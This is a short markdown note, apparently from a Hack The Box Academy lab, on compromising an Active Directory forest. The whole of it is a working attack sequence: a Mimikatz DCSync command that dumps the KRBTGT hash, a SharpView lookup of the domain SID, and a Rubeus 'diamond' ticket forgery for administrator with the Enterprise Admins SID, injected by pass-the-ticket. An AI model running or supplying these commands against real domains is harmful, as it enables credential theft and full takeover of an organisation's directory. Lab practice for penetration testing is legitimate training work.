# Forest Compromise

Get the hash of the KRBTGT user

```sh
.\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:SDE\krbtgt" exit
```

Get the SID of domain

```shell
sharpview -- Get-DomainSid -Domain inlanefreight.local -t 120
```

With Rubeus execute a diamond attack

```shell
inline-execute-assembly /home/htb-ac-8414/Rubeus.exe "diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-1091722548-1143476209-2285759316-519 /krbkey:161ca21b478565107a337eab8626f584c4cbe4d724e52f0ed7ff4c35234b7669 /nowrap /ptt"
```

